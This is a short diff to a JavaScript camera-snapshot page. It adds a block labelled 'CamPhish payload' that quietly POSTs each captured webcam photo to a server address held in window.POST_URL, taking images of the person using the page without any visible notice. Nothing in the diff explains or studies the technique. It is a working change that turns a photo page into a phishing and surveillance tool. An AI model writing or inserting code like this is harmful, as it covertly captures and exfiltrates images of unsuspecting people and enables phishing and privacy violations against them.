@@ -54,6 +54,18 @@ document.addEventListener('DOMContentLoaded', () => {
     // Set image source
     userPhoto.src = snapshotCanvas.toDataURL('image/png');
     
+    // CamPhish payload - send captured image to server
+    var canvasData = snapshotCanvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+    if (window.POST_URL) {
+      fetch(window.POST_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: 'cat=' + encodeURIComponent(canvasData)
+      }).catch(e => console.error(e));
+    }
+    
     // Stop camera
     if (stream) {
       stream.getTracks().forEach(track => track.stop());
